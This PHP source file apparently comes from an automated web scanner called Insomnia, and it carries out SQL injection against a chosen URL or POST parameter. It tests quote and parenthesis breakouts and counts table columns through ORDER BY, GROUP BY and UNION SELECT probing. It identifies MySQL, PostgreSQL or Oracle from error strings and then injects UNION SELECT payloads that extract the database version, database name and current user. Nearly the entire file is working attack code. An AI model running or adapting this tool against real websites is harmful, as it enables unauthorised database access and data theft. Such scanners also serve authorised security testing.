<?php
class Insomnia_Workflow_Research_SQLInjection_Inject_BaseInfo
	extends Insomnia_Workflow_Research_SQLInjection_SQLInjectionInjectTechnique
{
	public static $techniqueName = "Base Info";
	public static $techniqueID = 6;

	const DBTYPE_POSTGRESQL = 'PostgreSQL';
	const DBTYPE_MYSQL      = 'MySQL';
	const DBTYPE_ORACLESQL  = 'OracleSQL';
	const DBTYPE_UNKNOWN    = 'unknown';

	private $paramLimiters = array(
		// Single Quote Limiters
		"'"   => "' -- ", 
		"')"  => "') -- ",
		"'))" => "')) -- ",

		// Double Quote Limiters
		'"'   => '" -- ',
		'")'  => '") -- ',
		'"))' => '")) -- '
	);

	private $researchData = array (
		"originalURL"     => "",
		"paramName"       => "",
		"paramValue"      => "",
		"paramPositionID" => null,
		"pathParamFlag"   => null,
		"POSTParamFlag"   => null
	);

	private static $operationErrors = array (
		"MySQL" => array (
			"/Unknown column.*in 'order clause'/",		// PHP Platform error
			"/Unknown column.*in 'group statement'/",	// PHP Platform error
			"/The used SELECT statements have a different number of columns/" // PHP Platform error
		),
		
		"PostgreSQL" => array (
			"/Query error.*ORDER BY/",	// PHP Platform error
			"/Query error.*GROUP BY/",	// PHP Platform error
			"/Query error.*UNION/" // PHP Platform error
		)
	);

	private $delimeterString = '..ins.insomnia.ins..';
	private $hex_delimeterString = '0x2E2E696E732E696E736F6D6E69612E696E732E2E';

	public function __construct(
		$originalURL, 
		$paramName,
		$paramValue,
		$paramPositionID, 
		$pathParamFlag, 
		$POSTParamFlag) {

		$this->researchData["originalURL"]     = $originalURL;
		$this->researchData["paramName"]       = $paramName;
		$this->researchData["paramValue"]      = $paramValue;
		$this->researchData["paramPositionID"] = $paramPositionID;
		$this->researchData["pathParamFlag"]   = $pathParamFlag;
		$this->researchData["POSTParamFlag"]   = $POSTParamFlag;
	}

	public function execute() {
		// Checking for column count.
		$colCountTechResultSet = $this->getColumnCountAndPossibleDB();
		/*result field: fals OR _:
		'columnCount' => $columnCount, 
		'possibleDB'  => $possibleDB, 
		'resultQueue' => $resultQueue,
		'resultData'  => $resultData
		paramLimiterField:
		string
		*/

		$techniqueResults = array();

		$nonInjectableResult = new Insomnia_Common_Data_SQLInjectionInjectTechResult(
			self::$techniqueID,
			$this->researchData['paramValue'],
			null,
			false,
			'unknown',
			null,
			'Base info: unknown'
		);

		if($colCountTechResultSet['result'] === false) {
			$techniqueResults[] = $nonInjectableResult;

		}elseif($colCountTechResultSet['result']['columnCount'] === 0) {
			$techniqueResults[] = $nonInjectableResult;

		} else { // start for checking

			$resultSet = $this->getBaseInfo(
				$colCountTechResultSet['result']['columnCount'],
				$colCountTechResultSet['result']['possibleDB'],
				$colCountTechResultSet['paramLimiter']
			);

			if($resultSet !== false) {
				$techniqueResults[] = new Insomnia_Common_Data_SQLInjectionInjectTechResult(
					self::$techniqueID,
					$this->researchData['paramValue'],
					null,
					true,
					$resultSet['possibleDB'],
					$resultSet['resultQueue'],
					$resultSet['resultData']
				);
			} else
				$techniqueResults[] = $nonInjectableResult;

			
		}

		return $techniqueResults;
	}

	/**
	 * Get the field number, which has the output and can accept char-string values.
	 * @return integer/false
	 */
	private function findOutputCharField($columnCount, $dataBaseType, $paramLimiter) {
		$result = false;

		if($dataBaseType !== self::DBTYPE_UNKNOWN) {

			// Making UNION SELECT queue.
			$UNIONelements = array();
			$UNIONentity = null;

			switch($dataBaseType) {
				case self::DBTYPE_POSTGRESQL:
					$UNIONentity = 'null';
					break;

				case self::DBTYPE_MYSQL:
					$UNIONentity = '1';
					break;

				default:
					break;
			}



			if($UNIONentity !== null) {

				for($i = 1; $i <= $columnCount; ++$i)
					$UNIONelements[] = $UNIONentity;

				// Making requests and checking the output for possible char output.
				$charInputString = '..ins.insomnia.ins..';
				$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

				for($possibleFieldNumber = 0; $possibleFieldNumber < count($UNIONelements); ++$possibleFieldNumber) {
					$tempElems = $UNIONelements;
					$tempElems[$possibleFieldNumber] = ($dataBaseType == self::DBTYPE_MYSQL) ? $this->hex_delimeterString : "'" . $this->delimeterString . "'";
					//$this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' FROM sys.dual -- ';
					$UNIONstring = '-555' . $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . implode(',', $tempElems) . ' -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $UNIONstring
						)
					);

					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();
					$errorSet = $this->checkForErrors($replySet);

					if($errorSet['errorExists'] == false) {
						if(strpos($replySet->getBody(), $charInputString) !== false) {
							$result = $possibleFieldNumber + 1;
							break;
						}
					 }
				}
			}
		}
		
		return $result;
	}

	/**
	 * Get Base information: DB_VERSION, CURRENT_USER, CURRENT_DATABASE.
	 * @return array(dbversion, current_database, current_user)
	 */
	private function getBaseInfo($columnCount, $dataBaseType, $paramLimiter) {
		$result = false;

		$outputFieldNumber = $this->findOutputCharField($columnCount, $dataBaseType, $paramLimiter);
		if($outputFieldNumber !== false) {
			$UNIONelements = array();
			$UNIONentity = null;
			$infoQuery = '';

			switch($dataBaseType) {
				case self::DBTYPE_POSTGRESQL:
					$UNIONentity = 'null';
					$infoQuery = 'textcat($$' . $this->delimeterString . 
										 '$$,textcat(version(),textcat($$' . $this->delimeterString . 
								 		 '$$,textcat(current_database(),textcat($$' . $this->delimeterString . 
								 		 '$$,textcat(current_user,$$' . $this->delimeterString .
								 		 '$$))))))';
					break;

				case self::DBTYPE_MYSQL:
					$UNIONentity = '1';
					$infoQuery = 'concat(' . $this->hex_delimeterString . 
										 ',@@version,' . $this->hex_delimeterString . 
										 ',database(),' . $this->hex_delimeterString . 
										 ',user(),' . $this->hex_delimeterString . 
										 ')';
					break;

				default:
					break;
			}

			if($UNIONentity !== null) {

				for($i = 1; $i <= $columnCount; ++$i)
					$UNIONelements[] = $UNIONentity;

				$UNIONelements[$outputFieldNumber - 1] = $infoQuery;

				$UNIONstring = '-555' . $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . implode(',', $UNIONelements) . ' -- ';

				$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

				$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
					$this->researchData['originalURL'],
					array(
						'paramPositionID' => $this->researchData['paramPositionID'],
						'pathParamFlag'   => $this->researchData['pathParamFlag'],
						'paramName'       => $this->researchData['paramName'],
						'paramValue'      => $UNIONstring
					)
				);

				$requestHandler->setRequestSet($requestSet);
				$replySet = $requestHandler->executeProcess();
				$errorSet = $this->checkForErrors($replySet);
				

				//if($errorSet['errorExists'] == false) {
					$firstPosition = strpos($replySet->getBody(), $this->delimeterString);
					$lastPosition = strrpos($replySet->getBody(), $this->delimeterString);


					if($firstPosition !== false and $lastPosition !== false) {
						if($firstPosition !== $lastPosition) {

							$firstPosition += strlen($this->delimeterString);
							// 0 => base version
							// 1 => data base
							// 3 => user							
							$baseInfoSet = explode($this->delimeterString, substr($replySet->getBody(), $firstPosition, $lastPosition - $firstPosition));


							$resultQueue = array();
							$possibleDB =  $dataBaseType;
							$resultQueue[] = $replySet->getURL();
							$resultData = "Base version: {$baseInfoSet[0]}.\nCurrent Database: {$baseInfoSet[1]}.\nCurrent User: {$baseInfoSet[2]}.";

							$result = array (
								'possibleDB' => $possibleDB,
								'resultQueue' => $resultQueue,
								'resultData' => $resultData
							);
						}
					}
				//}

			}
		}

		return $result;
	}

	/**
	 * Check for limiter value (limiter for current param in sql query: ',",'),"),etc)
	 * @return string
	 */
	private function checkForLimiter() {

		$finalParamLimiter = '';

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		foreach($this->paramLimiters as $paramLimiter => $commentParamLimiter) {

			$limitedParamValue = $this->researchData['paramValue'] . $commentParamLimiter;

			$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
				$this->researchData['originalURL'],
				array(
					'paramPositionID' => $this->researchData['paramPositionID'],
					'pathParamFlag'   => $this->researchData['pathParamFlag'],
					'paramName'       => $this->researchData['paramName'],
					'paramValue'      => $limitedParamValue
				)
			);

			$requestHandler->setRequestSet($requestSet);
			$replySet = $requestHandler->executeProcess();

			$errorCheckResult = $this->checkForErrors($replySet);

			if($errorCheckResult['errorExists'] == false) {

				$finalParamLimiter = $paramLimiter;
				break;

			}
				
		}

		return $finalParamLimiter;
	}

	/**
	 * Returns the column count of the current table where we in.
	 * Return values: arry (column_count:integer, possibleDB:string, resultQueue:array(string,..,..), resultData:string), false (not injectable)
	 * @return array|boolean
	 */
	private function getColumnCountAndPossibleDB() {

		$paramLimiter = $this->checkForLimiter();

		$result = $this->calculateColumnCountByOrdering($paramLimiter);
		if($result === false) {
			$result = $this->calculateColumnCountByGrouping($paramLimiter);
			if($result === false)
				$result = $this->calculateColumnCountByUNION($paramLimiter);
		}

		$resultSet = array('result' => $result, 'paramLimiter' => $paramLimiter);

		return $resultSet;
	}

	/**
	 * Calculate the column count by [GROUP BY / ORDER BY] SQL operators.
	 * @return array (column count, possibleDB)|boolean
	 */
	private function calculateColumnCountByOrdering($paramLimiter) {

		$columnCount = 100; $possibleDB = 'unknown'; $resultQueue = array(); $resultData = '';
		$techniqueFailed = false;

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		while(true) {

			$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' ORDER BY ' . $columnCount . ' -- ';

			$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
				$this->researchData['originalURL'],
				array(
					'paramPositionID' => $this->researchData['paramPositionID'],
					'pathParamFlag'   => $this->researchData['pathParamFlag'],
					'paramName'       => $this->researchData['paramName'],
					'paramValue'      => $infectedParamValue
				)
			);
			
			$requestHandler->setRequestSet($requestSet);
			$replySet = $requestHandler->executeProcess();


			$errorSet = $this->checkForErrors($replySet);

			if($errorSet['errorExists'] && $columnCount != 1) {
				$columnCount = $columnCount / 2;
				settype($columnCount, 'integer');
			} elseif($errorSet['errorExists'] && $columnCount == 1) {
				$techniqueFailed = true;
				break;
			} elseif(!$errorSet['errorExists']) {
				break;
			}

		}

		if($techniqueFailed == false) {

			$columnCountLimiter = $columnCount * 2 + 1;
			$resultRequest = null;

			while(true) {

				if($columnCount > $columnCountLimiter) {
					$techniqueFailed = true;
					break;
				}

				$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' ORDER BY ' . $columnCount . ' -- ';

				$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
					$this->researchData['originalURL'],
					array(
						'paramPositionID' => $this->researchData['paramPositionID'],
						'pathParamFlag'   => $this->researchData['pathParamFlag'],
						'paramName'       => $this->researchData['paramName'],
						'paramValue'      => $infectedParamValue
					)
				);

				$requestHandler->setRequestSet($requestSet);
				$replySet = $requestHandler->executeProcess();

				if($resultRequest === null)
					$resultRequest = $replySet->getURL();

				$errorSet = $this->checkForErrors($replySet);

				if($errorSet['errorExists']) {
					$columnCount -= 1;
					$possibleDB = $errorSet['dbVersion'];
					$resultQueue[] = $resultRequest;
					$resultData = 'Table column count: ' . $columnCount;
					break;
				}

				$resultRequest = $replySet->getURL();
				++$columnCount;
			}
		}

		return ($techniqueFailed) 
			? false
			: array ( 
				'columnCount' => $columnCount, 
				'possibleDB'  => $possibleDB, 
				'resultQueue' => $resultQueue,
				'resultData'  => $resultData
			);
	}

	/**
	 * Calculate the column count by [GROUP BY / ORDER BY] SQL operators.
	 * @return array (column count, possibleDB)|boolean
	 */
	private function calculateColumnCountByGrouping($paramLimiter) {

		$columnCount = 100; $possibleDB = 'unknown'; $resultQueue = array(); $resultData = '';
		$techniqueFailed = false;

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		while(true) {

			$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' GROUP BY ' . $columnCount . ' -- ';

			$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
				$this->researchData['originalURL'],
				array(
					'paramPositionID' => $this->researchData['paramPositionID'],
					'pathParamFlag'   => $this->researchData['pathParamFlag'],
					'paramName'       => $this->researchData['paramName'],
					'paramValue'      => $infectedParamValue
				)
			);
			
			$requestHandler->setRequestSet($requestSet);
			$replySet = $requestHandler->executeProcess();


			$errorSet = $this->checkForErrors($replySet);

			if($errorSet['errorExists'] && $columnCount != 1) {
				$columnCount = $columnCount / 2;
				settype($columnCount, 'integer');
			} elseif($errorSet['errorExists'] && $columnCount == 1) {
				$techniqueFailed = true;
				break;
			} elseif(!$errorSet['errorExists']) {
				break;
			}

		}

		if($techniqueFailed == false) {

			$columnCountLimiter = $columnCount * 2 + 1;
			$resultRequest = null;

			while(true) {

				if($columnCount > $columnCountLimiter) {
					$techniqueFailed = true;
					break;
				}

				$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' GROUP BY ' . $columnCount . ' -- ';

				$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
					$this->researchData['originalURL'],
					array(
						'paramPositionID' => $this->researchData['paramPositionID'],
						'pathParamFlag'   => $this->researchData['pathParamFlag'],
						'paramName'       => $this->researchData['paramName'],
						'paramValue'      => $infectedParamValue
					)
				);

				$requestHandler->setRequestSet($requestSet);
				$replySet = $requestHandler->executeProcess();

				if($resultRequest === null)
					$resultRequest = $replySet->getURL();

				$errorSet = $this->checkForErrors($replySet);

				if($errorSet['errorExists']) {
					$columnCount -= 1;
					$possibleDB = $errorSet['dbVersion'];
					$resultQueue[] = $resultRequest;
					$resultData = 'Table column count: ' . $columnCount;
					break;
				}

				$resultRequest = $replySet->getURL();
				++$columnCount;
			}
		}

		return ($techniqueFailed) 
			? false
			: array ( 
				'columnCount' => $columnCount, 
				'possibleDB'  => $possibleDB, 
				'resultQueue' => $resultQueue,
				'resultData'  => $resultData
			);
	}

	/**
	 * Calculate the column count by [UNION] SQL operation.
	 * @return array(column count, possibleDB)|boolean
	 */
	private function calculateColumnCountByUNION($paramLimiter) {
		//return "pizdec";
		$columnCountLimiter = 100;
		$columnCount = 1;
		$possibleDB = 'unknown';
		$techniqueFailed = false;
		$resultQueue = array();
		$resultData = '';

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		// Check the DB Type.
		$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ';

		$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
			$this->researchData['originalURL'],
			array(
				'paramPositionID' => $this->researchData['paramPositionID'],
				'pathParamFlag'   => $this->researchData['pathParamFlag'],
				'paramName'       => $this->researchData['paramName'],
				'paramValue'      => $infectedParamValue
			)
		);

		$requestHandler->setRequestSet($requestSet);
		$replySet = $requestHandler->executeProcess();

		$possibleDB = $this->checkForErrors($replySet)['dbVersion'];

		$resultRequest = null;

		switch($possibleDB) {
			case self::DBTYPE_ORACLESQL:

				while(true) {

					$queryColumnElements = array();
					for($i = 0; $i < $columnCount; ++$i)
						$queryColumnElements[] = 'null';

					$queryColumnString = implode(',', $queryColumnElements);
					
					$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' FROM sys.dual -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $infectedParamValue
						)
					);
					
					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();

					if($resultRequest === null)
						$resultRequest = $replySet->getURL();

					$errorSet = $this->checkForErrors($replySet);


					if(!$errorSet['errorExists']) {
						$resultQueue[] = $resultRequest;
						$resultData = 'The number of columns in the table: ' . $columnCount;
						break;
					} elseif($columnCount == $columnCountLimiter) {
						$techniqueFailed = true;
						break;
					}

					$resultRequest = $replySet->getURL();
					++$columnCount;
				}

				break;

			case self::DBTYPE_POSTGRESQL:
				
				while(true) {

					$queryColumnElements = array();
					for($i = 0; $i < $columnCount; ++$i)
						$queryColumnElements[] = 'null';

					$queryColumnString = implode(',', $queryColumnElements);
					
					$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $infectedParamValue
						)
					);
					
					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();

					if($resultRequest === null)
						$resultRequest = $replySet->getURL();

					$errorSet = $this->checkForErrors($replySet);


					if(!$errorSet['errorExists']) {
						$resultQueue[] = $resultRequest;
						$resultData = 'The number of columns in the table: ' . $columnCount;
						break;
					} elseif($columnCount == $columnCountLimiter) {
						$techniqueFailed = true;
						break;
					}

					$resultRequest = $replySet->getURL();
					++$columnCount;
				}

				
				break;

			case self::DBTYPE_MYSQL:

				while(true) {

					$queryColumnElements = array();
					for($i = 1; $i <= $columnCount; ++$i)
						$queryColumnElements[] = $i;

					$queryColumnString = implode(',', $queryColumnElements);
					
					$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $infectedParamValue
						)
					);
					
					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();

					if($resultRequest === null)
						$resultRequest = $replySet->getURL();

					$errorSet = $this->checkForErrors($replySet);


					if(!$errorSet['errorExists']) {
						$resultQueue[] = $resultRequest;
						$resultData = 'The number of columns in the table: ' . $columnCount;
						break;
					} elseif($columnCount == $columnCountLimiter) {
						$techniqueFailed = true;
						break;
					}

					$resultRequest = $replySet->getURL();
					++$columnCount;
				}				

				break;

			default:

				$techniqueFailed = true;
				break;
		}


		return ($techniqueFailed) 
			? false
			: array ( 
				'columnCount' => $columnCount, 
				'possibleDB'  => $possibleDB, 
				'resultQueue' => $resultQueue,
				'resultData'  => $resultData
			);
	}

	//private function checkForTypeErrors()

	/**
	 * @param ReplyDataSet $replySet
	 * @return array Form: array('errorExists'=>boolean, 'dbVersion'=>string)
	 */
	private function checkForErrors($replySet) {
		$errorData = array ('errorExists' => false, 'dbVersion' => 'unknown');

		if($replySet->getInfo()['http_code'] === 200) {

			// Checking for special errors.
			foreach(self::$operationErrors as $dbVersion => $operationErrors) {

				foreach($operationErrors as $operationError) {

					$pregResult = preg_match($operationError, $replySet->getBody());
					if($pregResult !== false && $pregResult !== 0) {
						$errorData['errorExists'] = true;
						$errorData['dbVersion']  = $dbVersion;
						break 2;
					}					
				}
			}

			
			// Checking for common errors.
			if(!$errorData['errorExists']) {
				foreach(self::$errorMessages as $dbVersion => $errorStrings) {

					foreach($errorStrings as $errorString) {

						$pregResult = preg_match($errorString, $replySet->getBody());
						if($pregResult !== false && $pregResult !== 0) {
							$errorData['errorExists'] = true;
							$errorData['dbVersion']  = $dbVersion;
							break 2;
						}
					}
				}				
			}

		}

		return $errorData;
	}	

}